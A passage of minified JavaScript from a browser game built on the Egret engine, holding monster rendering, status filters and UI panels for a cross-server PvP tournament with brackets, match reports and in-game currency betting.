this._state==l.EntityAction.RUN||this._state==l.EntityAction.STAND?-1:1},e.prototype.showBlood=function(t){this._hpBar.visible=t},Object.defineProperty(e.prototype,"isMy",{get:function(){return this.infoModel.isMy},enumerable:!1,configurable:!0}),e.prototype.updateModel=function(){this.parseModel()},e.prototype.parseModel=function(){var t=this,e=this.infoModel;e.isMy||(t.updateBlood(!0),t.setCharName(e.name)),t.setConfig(e.avatar+""),t.updateTitle(),t.setBodyScale(e.avatarScale)},e.prototype.addGroup=function(t){var e=s.EntityFilterUtil.getEntityFilter(t);if(e){this.filterDic[e]=this.filterDic[e]||[];var i=this.filterDic[e].indexOf(t);-1==i&&(this.filterDic[e].push(t),this.updateFilter())}},e.prototype.removeGroup=function(t){var e=s.EntityFilterUtil.getEntityFilter(t);if(e){var i=this.filterDic[e];if(!i)return;var n=i.indexOf(t);n>=0&&(i.splice(n,1),this.updateFilter())}},e.prototype.updateFilter=function(){var t=s.EntityFilter.no;this.hasFilter(s.EntityFilter.hard)?t=s.EntityFilter.hard:this.hasFilter(s.EntityFilter.poison)&&(t=s.EntityFilter.poison),this.curFilter!=t&&this.setFilter(t)},e.prototype.hasFilter=function(t){return!(!this.filterDic[t]||!this.filterDic[t].length)},e.prototype.setFilter=function(t){this.curFilter=t,t?(this.setMcFilter(t),t==s.EntityFilter.hard?this.setMcFilterPlayOrStop(!1):this.setMcFilterPlayOrStop(!0)):(this.setMcFilter(t),this.setMcFilterPlayOrStop(!0))},e.prototype.setMcFilter=function(t){if("webgl"==egret.Capabilities.renderMode)for(var e in this._disOrder)if(+e!=h.CharMcOrder.ZHANLING){var i=this._disOrder[e];i.filters=t?s.EntityFilterUtil.buffFilter[t].filters:null}},e.prototype.setMcFilterPlayOrStop=function(t){for(var e in this._disOrder)if(+e!=h.CharMcOrder.ZHANLING){var i=this.getMc(+e);i&&(t?i.play():i.stop())}},e.prototype.removeAllFilters=function(){this.filterDic={},this.curFilter=s.EntityFilter.no;for(var t in this._disOrder){var e=this._disOrder[t];e.filters=null}},e.prototype.isDie=function(){return this.infoModel.getAtt(u.AttributeType.atHp)<=0},__decorate([callDelay(100)],e.prototype,"updateAlpha",null),__decorate([post()],e,"die",null),e}(n.CharEffect);e.CharMonster=C,window.CharMonster=C,__reflect(C.prototype,"CharMonster",[]),window.CharMonster=C},function(t,e,i){"use strict";var n;Object.defineProperty(e,"__esModule",{value:!0}),e.EntityFilterUtil=e.EntityFilter=void 0;var o,s=i(49);!function(t){t[t.no=0]="no",t[t.hard=1]="hard",t[t.poison=2]="poison"}(o=e.EntityFilter||(e.EntityFilter={})),window.EntityFilter=o;var a=function(){function t(){}return t.getEntityFilter=function(e){var i=o.no;return t.isHard(e)?i=o.hard:t.isPoison(e)&&(i=o.poison),i},t.isHard=function(t){return 51001==t||150065==t},t.isPoison=function(t){return 23001==t||61001==t||150071==t},t.buffFilter=(n={},n[o.hard]={filters:s.FilterUtil.ARRAY_GRAY_FILTER},n[o.poison]={filters:s.FilterUtil.ARRAY_GREEN_FILTER},n),t}();e.EntityFilterUtil=a,window.EntityFilterUtil=a,__reflect(a.prototype,"EntityFilterUtil",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PaoPaoView=void 0;var n=i(1),o=i(990),s=i(16),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.jobText=[16146438,16146438,2933496,14831353],e.spParan=[],e._sn_="paopaoSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.x=-this.width/2;var i=this.spParan,n=i[0],s=i[1];Timer.stopAll(this),this.start(),this.nameTxt.textColor=this.jobText[s];var a=o.BubbleFactory.ins().playBubbleEffect(n);a&&(this.nameTxt.text=a,this.nameTxt.x=-this.nameTxt.textWidth>>1)},e.prototype.setSpeak=function(t,e){void 0===e&&(e=1),this.spParan=[t,e]},e.prototype.start=function(){Timer.start(1e3,1,this.destruct,this)},e.prototype.destruct=function(){s.DisplayUtils.removeFromParent(this)},e}(n.BaseView);e.PaoPaoView=a,window.PaoPaoView=a,__reflect(a.prototype,"PaoPaoView",[]),window.PaoPaoView=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BubbleType=e.BubbleFactory=void 0;var n=i(50),o=i(0),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.playBubbleEffect=function(t){var e="",i=o.GlobalConfig.BubbleConfig[t];if(i)switch(i.type){case a.B1:e=i.news;break;case a.B2:if(i.news)break}return e},e}(n.BaseClass);e.BubbleFactory=s,window.BubbleFactory=s,__reflect(s.prototype,"BubbleFactory",[]);var a;!function(t){t[t.B1=1]="B1",t[t.B2=2]="B2"}(a=e.BubbleType||(e.BubbleType={})),window.BubbleType=a,window.BubbleFactory=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EntityHp=void 0;var n=i(1),o=i(992),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="entityhpskin",e.zIndex=o.ComponentIndex.progress,e}return __extends(e,t),e.prototype.skinComplete=function(){this.anchorOffsetX=30},e.prototype.setProgress=function(t,e,i){void 0===e&&(e=1),1==e?(this.hp=t,i&&(this.hpMax=i)):(this.mp=t,i&&(this.mpMax=i))},e}(n.BaseView);e.EntityHp=s,window.EntityHp=s,__reflect(s.prototype,"EntityHp",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComponentIndex=void 0;var n;!function(t){t[t.name=5e4]="name",t[t.progress=4e4]="progress",t[t.shadow=-1]="shadow"}(n=e.ComponentIndex||(e.ComponentIndex={})),window.ComponentIndex=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSBattleFbItem=void 0;var n=i(21),o=i(3),s=i(0),a=i(994),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list0.itemRenderer=a.HSBattleHeadItem,this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data&&this.data[0]&&!(this.data[0].length<1)&&this.data[1]&&!(this.data[1].length<1)){this.choose.visible=this.data[2],this.mc&&this.mc.stop(),this.data[2]&&(this.mc=new n.MovieClip,this.mc.playFile(RES_DIR_EFF+"BattlEff1",-1),this.eff.addChild(this.mc));s.GlobalConfig.LfRaceBase.winnerImg;this.result.source=this.data[4]?1==this.data[3]?"wjzb_QChallenge_win_png":2==this.data[3]?"wjzb_WarReport_result3_png":"wjzb_QChallenge_lose_png":"";var t=[];for(var e in this.data[0])t.push([this.data[0][e],this.data[1][this.data[0][e]-1],!(this.data[4]&&(!this.data[3]||2==this.data[3]))]);this.list0.dataProvider=new eui.ArrayCollection(t)}},e}(o.BaseItemRender);e.HSBattleFbItem=r,window.HSBattleFbItem=r,__reflect(r.prototype,"HSBattleFbItem",[]),window.HSBattleFbItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSBattleHeadItem=void 0;var n=i(49),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data&&this.data[0]){var t=this.data[0],e=(this.data[1],this.data[2]);this.roleHead.filters=e?null:n.FilterUtil.ARRAY_GRAY_FILTER,this.job.source="job"+t+"Item",this.roleHead.source="yuanhead"+t+"1",this.die.visible=this.data[3]}},e}(o.BaseItemRender);e.HSBattleHeadItem=s,window.HSBattleHeadItem=s,__reflect(s.prototype,"HSBattleHeadItem",[]),window.HSBattleHeadItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSFbTeamItem=void 0;var n=i(49),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data[0]&&(this.data[1]||0==this.data[1])&&(this.data[2]||0==this.data[2])&&(this.headImg.source="yuanhead"+this.data[0]+this.data[1],this.bloodBar.value=this.data[2],this.bloodBar.maximum=this.data[3],this.die.visible=!this.data[2],this.headImg.filters=this.data[2]?null:n.FilterUtil.ARRAY_GRAY_FILTER)},e}(o.BaseItemRender);e.HSFbTeamItem=s,window.HSFbTeamItem=s,__reflect(s.prototype,"HSFbTeamItem",[]),window.HSFbTeamItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSKnockoutItem=void 0;var n=i(18),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.round.text=gettext("淘汰赛第{0}场",this.data.round),this.player.text=this.data.name?"s"+this.data.serverid+"."+this.data.name:"轮空",this.data.isWin?(this.result.textColor=n.ColorUtil.GREEN,this.result.text=gettext("胜利")):(this.result.textColor=n.ColorUtil.RED,this.result.text=gettext("失败")))},e}(o.BaseItemRender);e.HSKnockoutItem=s,window.HSKnockoutItem=s,__reflect(s.prototype,"HSKnockoutItem",[]),window.HSKnockoutItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSPVPResultWin=void 0;var n=i(5),o=i(1),s=i(46),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSPVPResultSkin",e.rectClose=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.dataProvider=new eui.ArrayCollection([]),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],o=t[1],a=t[2],r=(t[3],t[4]);this.bg.source=0==i?"teamFb_lose_png":"teamFb_win_png",this.closeBtn.name=gettext("确定");var l=r[1].name,h=r[2].name,u=r[1].serverId,p=r[2].serverId,d=r[1].round,c=r[2].round,f=s.HegemonyCT.ins(),g=0;f.state==s.HegemonyStatus.Challenge&&f.challengeData[0]&&h==f.challengeData[0].beChooseName&&p==f.challengeData[0].beServer&&(l=r[2].name,h=r[1].name,u=r[2].serverId,p=r[1].serverId,d=r[2].round,c=r[1].round,g=1,o=t[2],a=t[1]),this.score.text=d+"."+c,this.server1.text=u+"",this.server2.text=p+"",this.playName1.textFlow=n.TextFlowMaker.generateTextFlow1("|C:0x0000FF&T:"+l+"|"),this.playName2.textFlow=n.TextFlowMaker.generateTextFlow1("|C:0xF3311E&T:"+h+"|"),this.repeatTimes=5,Timer.start(1e3,0,this.updateCloseBtnLabel,this)
},e.prototype.removeDisplay=function(){Timer.stop(this.updateCloseBtnLabel,this)},e.prototype.updateCloseBtnLabel=function(){this.repeatTimes--,this.repeatTimes<=0&&(win.close(this),send(Ts.exitFB)),this.closeBtn.label=gettext("退出(")+this.repeatTimes+"s)"},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:send(Ts.exitFB),win.close(this)}},e}(o.BaseView);e.HSPVPResultWin=a,window.HSPVPResultWin=a,__reflect(a.prototype,"HSPVPResultWin",[]),window.HSPVPResultWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSPreBattlePanel=void 0;var n=i(42),o=i(5),s=i(1),a=i(0),r=i(97),l=i(46),h=i(256),u=i(257),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSPreviousEventsVSItem",e.tabSelect=0,e.curGroup=1,e.PK_GROUP_1=1,e.PK_GROUP_2=2,e.PK_GROUP_3=3,e.MAX=16,e}return __extends(e,t),e.prototype.skinComplete=function(){this.tab.itemRenderer=u.HSTabItem,this.vewChampScore.visible=this.eTab.visible=this.title.visible=this.content.visible=this.desc.visible=this.tab.visible=!1,this.addTouchEvent(this,this.onTouch),this.btnList=[],this.btnList[this.PK_GROUP_1]=[],this.btnList[this.PK_GROUP_2]=[],this.btnList[this.PK_GROUP_3]=[];for(var t=1;t<=this.MAX;t++){var e=this["actState_1_"+t],i=this["actState_2_"+t],n=this["actState_3_"+t];e&&(e.name=this.PK_GROUP_1+"_"+t,this.btnList[this.PK_GROUP_1].push(e),e.visible=!1),i&&(i.name=this.PK_GROUP_2+"_"+t,this.btnList[this.PK_GROUP_2].push(i),i.visible=!1),n&&(n.name=this.PK_GROUP_3+"_"+t,this.btnList[this.PK_GROUP_3].push(n),n.visible=!1)}this.finals.touchChildren=!1;for(var o=0,s=this.btnList;o<s.length;o++){var r=s[o];if(r)for(var l=0,h=r;l<h.length;l++){var p=h[l];this.addTouchEvent(p,this.onTouchBtn)}}for(var d=[],t=1;3>=t;t++)d.push({groupId:t,icon:a.GlobalConfig.LfRaceBase.groupIcon[t]});this.eTab.dataProvider=new eui.ArrayCollection(d),this.addChangeEvent(this.eTab,this.onGroupTap)},e.prototype.addDisplay=function(){this.observe(l.HegemonyCT.ins().postInit,this.update),this.observe(l.HegemonyCT.ins().postState,this.update),this.observe(l.HegemonyCT.ins().postAgainst,this.updateView),this.observe(l.HegemonyCT.ins().postChampion,this.updateWinner),this.observe(l.HegemonyCT.ins().postServerInfo,this.updateFinals),this.addChangeEvent(this.tab,this.onTap),this.ins=l.HegemonyCT.ins(),this.selectNo=this.ins.state>=l.HegemonyStatus.Finals?this.ins.NO:this.ins.NO-1,this.onChange(),this.update()},e.prototype.updateWinner=function(){if(this.ins.championNO==this.selectNo&&this.ins.championGroup==this.curGroup&&this.ins.curServerId&&this.ins.championPlayer){var t=[];t.push(this.ins.curServerId),this.ins.sendServerId(this.selectNo,t)}},e.prototype.update=function(){this.desc.visible=this.tab.visible=!0;for(var t=[],e=l.HegemonyCT.ins(),i=e.state>=l.HegemonyStatus.Finals?e.NO:e.NO-1;i>0;i--)t.push(i);this.tab.dataProvider=new eui.ArrayCollection(t),t[this.tabSelect]&&(this.selectNo=t[this.tabSelect],e.sendAgainst(this.selectNo,1)),this.updateView()},e.prototype.updateView=function(){this.selectNo&&this.ins.againstInfo[this.selectNo]?this.vewChampScore.visible=this.eTab.visible=this.title.visible=this.content.visible=!0:this.vewChampScore.visible=this.eTab.visible=this.title.visible=this.content.visible=!1;var t=this.ins.againstInfo[this.selectNo];if(t&&t[this.curGroup]){this.clearLink();for(var e in t[this.curGroup]){var i=t[this.curGroup][e].index,n=t[this.curGroup][e].server1,s=t[this.curGroup][e].server2,l=t[this.curGroup][e].winServer,h=t[this.curGroup][e].name1,u=t[this.curGroup][e].name2,p=a.GlobalConfig.LfRaceBase.nameColor;n&&this["player_"+i+"_1"]&&(this["player_"+i+"_1"].textFlow=o.TextFlowMaker.generateTextFlow1("S."+n+"\n|C:"+p+"&T:"+h+"|")),s&&this["player_"+i+"_2"]&&(this["player_"+i+"_2"].textFlow=o.TextFlowMaker.generateTextFlow1("S."+s+"\n|C:"+p+"&T:"+u+"|")),l&&n==l?r.PeakedHelp.setImgGroupSource(this["link_"+i+"_1"],"line_light"):l&&s==l&&r.PeakedHelp.setImgGroupSource(this["link_"+i+"_2"],"line_light")}this.refBetState()}},e.prototype.refBetState=function(){this.vewChampScore.visible=this.selectNo>0;var t=this.getAgainstData(4,1);t&&t.server1&&t.server2||(this.vewChampScore.visible=!1);for(var e in this.btnList)for(var i=0,n=this.btnList[e];i<n.length;i++){var o=n[i];if(o.visible=!0,o){var s=o.name.split("_"),a=this.getAgainstData(+s[0],+s[1]);a&&a.server1&&a.server2||(o.visible=!1),o.currentState="view"}}},e.prototype.clearLink=function(){for(var t=0;t<this.MAX;t++)this["link_"+t+"_1"]&&r.PeakedHelp.setImgGroupSource(this["link_"+t+"_1"],"line_black"),this["link_"+t+"_2"]&&r.PeakedHelp.setImgGroupSource(this["link_"+t+"_2"],"line_black"),this["player_"+t+"_1"]&&this["player_"+t+"_1"].text&&(this["player_"+t+"_1"].text=""),this["player_"+t+"_2"]&&this["player_"+t+"_2"].text&&(this["player_"+t+"_2"].text=""),this["btnImg"+t].source="wjzb_battleBg_"+this.curGroup},e.prototype.onTap=function(){this.tabSelect=this.tab.selectedIndex,this.update(),this.onChange()},e.prototype.onTouchBtn=function(t){var e=t.target.parent,i=e.name,n=i.split("_"),o=this.getAgainstData(+n[0],+n[1]);e.visible&&(l.HegemonyCT.ins().sendWarData(this.selectNo,this.curGroup,o.id),win.open(h.HSWarReportWin))},e.prototype.getAgainstData=function(t,e){var i=1;this.btnList[t]&&(i=this.btnList[t].length+(e?e-1:0));var n=this.ins.againstInfo[this.selectNo];if(n&&n[this.curGroup])for(var o in n[this.curGroup])if(n[this.curGroup][o].index==i)return n[this.curGroup][o]},e.prototype.onTouch=function(t){switch(t.target){case this.vewChampScore:var e=this.getAgainstData(4,1);this.vewChampScore.visible&&(l.HegemonyCT.ins().sendWarData(this.selectNo,this.curGroup,e.id),win.open(h.HSWarReportWin))}},e.prototype.onGroupTap=function(){this.curGroup=this.eTab.selectedItem.groupId,this.onChange()},e.prototype.onChange=function(){this.desc.text=gettext("第{0}届诸神之战{1}对战图",n.StringUtils.NumberToChinese(this.selectNo),a.GlobalConfig.LfRaceBase.groupName[this.curGroup-1]),this.ins.sendChampionInfo(this.selectNo,this.curGroup),this.ins.sendAgainst(this.selectNo,this.curGroup),this.updateFinals()},e.prototype.updateFinals=function(){this.ins.championServerId&&this.ins.championServerId==this.ins.roleServer&&this.ins.championNO==this.selectNo&&this.ins.championGroup==this.curGroup?(this.finals.visible=!0,this.schedule.visible=this.scheduleBg.visible=!1,this.headImg.source="yuanhead"+this.ins.roleJob+this.ins.roleSex,this.nameTxt.text="S."+this.ins.roleServer+"\n"+this.ins.roleName):(this.finals.visible=!1,this.schedule.visible=this.scheduleBg.visible=!0,this.schedule.source=a.GlobalConfig.LfRaceBase.stateImg[l.HegemonyStatus.Over])},__decorate([delayCall(300)],e.prototype,"updateFinals",null),e}(s.BaseView);e.HSPreBattlePanel=p,window.HSPreBattlePanel=p,__reflect(p.prototype,"HSPreBattlePanel",[]),window.HSPreBattlePanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSWarReportItem=void 0;var n=i(3),o=i(46),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data&&this.data[0]&&!(this.data[0].length<1)){var t=o.HegemonyCT.ins().warData[0];this.round.text=gettext("第{0}局",this.data[0].fightNo);var e=this.data[0].winner;this.server.text=1==e?"S."+t.server1:2==e?"S."+t.server2:"",this.playerName.text=1==e?t.name1:2==e?t.name2:""}},e}(n.BaseItemRender);e.HSWarReportItem=s,window.HSWarReportItem=s,__reflect(s.prototype,"HSWarReportItem",[]),window.HSWarReportItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSRoleItem=void 0;var n=i(3),o=i(0),s=i(10),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){var t;this.skin&&this.data&&(this.roleInfo=this.data,this.eNameLab.text=this.roleInfo.name,this.lb_lv.text=this.roleInfo.level.toString(),this.eIcon.source="yuanhead"+this.roleInfo.job+"1",this.bgkuang.source=this.roleInfo.outward?(null===(t=o.GlobalConfig.TitleConf[this.roleInfo.outward])||void 0===t?void 0:t.img)+"_png"||!1:"entity_bg",this.updateTitle(),this.updateWingEff(),this.updateDemonCirEff())},e.prototype.updateTitle=function(){var t=parseInt(this.roleInfo.titleID);if(this.eTitleGrp.visible=!!t,this.effTopGrp.visible=!1,this.eTitleGrp.visible){var e=o.GlobalConfig.TitleConf[t];this.eTitle.text=(null===e||void 0===e?void 0:e.name)||"",this.eTitle.textColor=s.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}},e.prototype.updateTitleEff=function(t){return(null===t||void 0===t?void 0:t.eff)?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+(null===t||void 0===t?void 0:t.eff),-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e.prototype.updateWingEff=function(){var t=this.roleInfo.wingID;if(!t)return this.wingMc&&this.wingEffGrp.removeChild(this.wingMc),this.wingMc=null,void(this.wingEffGrp.visible=!1);this.wingMc||(this.wingMc=ObjectPool.pop("MovieClip"),this.wingEffGrp.addChild(this.wingMc),this.wingEffGrp.visible=!0),this.wingMc.playFile(RES_DIR_EFF+t,-1);var e;for(var i in o.GlobalConfig.WingLevelConfig){var n=o.GlobalConfig.WingLevelConfig[i];if(n.appearance==t){e=n;break}}e&&e.size1?this.wingMc.scaleX=this.wingMc.scaleY=e.size1:this.wingMc.scaleX=this.wingMc.scaleY=1,e&&e.pos1?(this.wingMc.x=e.pos1.x,this.wingMc.y=e.pos1.y):(this.wingMc.x=0,this.wingMc.y=0)},e.prototype.updateDemonCirEff=function(){var t=this.roleInfo.demonCirID;if(!t)return this.demonCirMc&&this.demonCirEffGrp.removeChild(this.demonCirMc),this.demonCirMc=null,void(this.demonCirEffGrp.visible=!1);var e=o.GlobalConfig.DemonCirBase[t];this.demonCirMc||(this.demonCirMc=ObjectPool.pop("MovieClip"),this.demonCirEffGrp.addChild(this.demonCirMc),this.demonCirEffGrp.visible=!0),this.demonCirMc.playFile(RES_DIR_EFF+e.footEff,-1)},e}(n.BaseItemRender);e.HSRoleItem=a,window.HSRoleItem=a,__reflect(a.prototype,"HSRoleItem",[]),window.HSRoleItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HOutRecordWin=void 0;var n=i(1),o=i(0),s=i(46),a=i(1002),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSKnockoutRecordSkin",e.tabSelect=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=a.HOutRecordItem,this.addTouchEndEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(s.HegemonyCT.ins().postKnockoutReport,this.update),this.addChangeEvent(this.eTab,this.onchange),this.updateTab(),this.update()},e.prototype.onchange=function(){this.tabSelect=this.eTab.selectedIndex,s.HegemonyCT.ins().sendKnockoutReport(this.tabSelect+1),this.updateTab()},e.prototype.updateTab=function(){for(var t=[],e=0;e<Object.keys(o.GlobalConfig.LfRaceBase.groupName).length;e++){var i=o.GlobalConfig.LfRaceBase.groupName[e];t.push({name:i})}this.eTab.dataProvider=new eui.ArrayCollection(t)},e.prototype.update=function(){var t=s.HegemonyCT.ins().knockoutReport[0];if(t){t.reportData&&t.reportData.length>1&&t.reportData.sort(this.sort);for(var e in t.reportData)t.reportData[e].pos=+e+1;this.list.dataProvider=new eui.ArrayCollection(t.reportData)}},e.prototype.sort=function(t,e){return t.winTimes>e.winTimes?-1:t.winTimes<e.winTimes?1:t.name<e.name?-1:t.name>e.name?1:0},e.prototype.onClick=function(t){},e}(n.BaseView);e.HOutRecordWin=r,window.HOutRecordWin=r,__reflect(r.prototype,"HOutRecordWin",[]),window.HOutRecordWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HOutRecordItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&0!=this.data.length&&(this.data.pos>3?(this.rankImg.visible=!1,this.rank.visible=!0,this.rank.text=this.data.pos+""):(this.rankImg.visible=!0,this.rank.visible=!1,this.rankImg.source="paihang"+this.data.pos),this.player.text=this.data.name,this.server.text=this.data.serverId+"",this.result.text=""+this.data.winTimes+gettext("胜")+this.data.loseTimes+gettext("负"))},e}(n.BaseItemRender);e.HOutRecordItem=o,window.HOutRecordItem=o,__reflect(o.prototype,"HOutRecordItem",[]),window.HOutRecordItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSBetWin=void 0;var n=i(18),o=i(5),s=i(1),a=i(0),r=i(4),l=i(2),h=i(46),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSBetSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.numLabel.restrict="0-9",this.numLabel.maxChars=8,this.numLabel.text="1",this.select1.visible=this.select0.visible=!1,this.addTouchEndEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.group=t[0],this.id=t[1],this.serverId1=t[2],this.serverId2=t[3];var i=[];i.push(t[2],t[3]),h.HegemonyCT.ins().sendServerId(h.HegemonyCT.ins().NO,i),this.observe(h.HegemonyCT.ins().postServerInfo,this.update),this.changeInput(),this.update()},e.prototype.update=function(){var t=h.HegemonyCT.ins();for(var e in t.serverData)this.serverId1==t.serverData[e].server&&(this.face0.source="yuanhead"+t.serverData[e].job+"1",this.server0.text="S."+t.serverData[e].server,this.playName0.text=t.serverData[e].name),this.serverId2==t.serverData[e].server&&(this.face1.source="yuanhead"+t.serverData[e].job+"1",this.server1.text="S."+t.serverData[e].server,this.playName1.text=t.serverData[e].name)},e.prototype.onClick=function(t){switch(t.target){case this.aPlayerGroup:this.server0.text&&(this.select0.visible=!0,this.select1.visible=!1,this.curId=this.serverId1);break;case this.bPlayerGroup:this.server1.text&&(this.select1.visible=!0,this.select0.visible=!1,this.curId=this.serverId2);break;case this.minBtn:this.changeInput(0);break;case this.subBtn:this.changeInput(1);break;case this.addBtn:this.changeInput(2);break;case this.maxBtn:this.changeInput(3);break;case this.betBtn:var e=parseInt(this.numLabel.text);if(this.curId){if(r.ActorCC.yb<e)return void l.TipsCT.ins().showTips(gettext("元宝不足"));h.HegemonyCT.ins().sendBet(this.group,this.id,this.curId,e),win.close(this)}else l.TipsCT.ins().showTips(gettext("请先选择需要支持的玩家"));break;case this.numLabel:}},e.prototype.changeInput=function(t){var e=a.GlobalConfig.LFRaceBet,i=e.minCost,s=e.maxCost,l=parseInt(this.numLabel.text)||0;t?1==t&&l>i?l-=i:2==t&&s>l?l+=i:3==t&&(l=s):l=i;var h=r.ActorCC.yb<l?n.ColorUtil.RED:n.ColorUtil.GREEN_COLOR_N;this.numLabel.text=l+"",this.numLabel.textFlow=o.TextFlowMaker.generateTextFlow1("|C:"+h+"&T:"+l),this.winTxt.textFlow=o.TextFlowMaker.generateTextFlow1(e.winDesc.replace("%s",l/i*e.winItemNum+"")),this.loseTxt.textFlow=o.TextFlowMaker.generateTextFlow1(e.loseDesc.replace("%s",l/i*e.loseItemNum+""))},e}(s.BaseView);e.HSBetWin=u,window.HSBetWin=u,__reflect(u.prototype,"HSBetWin",[]),window.HSBetWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSMyBetWin=void 0;var n=i(55),o=i(1),s=i(46),a=i(1005),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSMyBetSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=a.HSMyBetItem,this.dataArr=new eui.ArrayCollection,this.list.dataProvider=this.dataArr,this.addTouchEndEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(s.HegemonyCT.ins().postBetData,this.update),this.update()},e.prototype.update=function(){s.HegemonyCT.ins().betData.sort(function(t,e){return n.Algorithm.sortDesc(t.index,e.index)}),this.dataArr.replaceAll(s.HegemonyCT.ins().betData)},e.prototype.onClick=function(t){switch(t.target){case this.bgClose:win.close(this)}},e}(o.BaseView);e.HSMyBetWin=r,window.HSMyBetWin=r,__reflect(r.prototype,"HSMyBetWin",[]),window.HSMyBetWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSMyBetItem=void 0;var n=i(5),o=i(3),s=i(0),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data&&0!=this.data.length){var t=s.GlobalConfig.LfRaceBase;this.desc.text=""+t.groupName[this.data.group-1]+t.state[this.data.state],this.server.text=this.data.serverId+"",this.score.text=this.data.cost+"",this.getIcon.visible=this.data.result<2;var e=this.getIcon.visible?"+"+this.data.betAwards[0].count:gettext("等待结果"),i=this.getIcon.visible?11645079:65280;this.result.textFlow=n.TextFlowMaker.generateTextFlow1("|C:"+i+"&T:"+e+"|")}},e}(o.BaseItemRender);e.HSMyBetItem=a,window.HSMyBetItem=a,__reflect(a.prototype,"HSMyBetItem",[]),window.HSMyBetItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSixteenRecordWin=void 0;var n=i(1),o=i(0),s=i(46),a=i(1007),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSSixteenRecordSkin",e.tabSelect=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=a.HSixteenRecordItem,this.addTouchEndEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(s.HegemonyCT.ins().postPlayer16Info,this.update),this.addChangeEvent(this.eTab,this.onchange),this.updateTab(),this.update()},e.prototype.onchange=function(){this.tabSelect=this.eTab.selectedIndex,s.HegemonyCT.ins().sendPlayerInfo(this.tabSelect+1),this.updateTab()},e.prototype.updateTab=function(){for(var t=[],e=0;e<Object.keys(o.GlobalConfig.LfRaceBase.groupName).length;e++){var 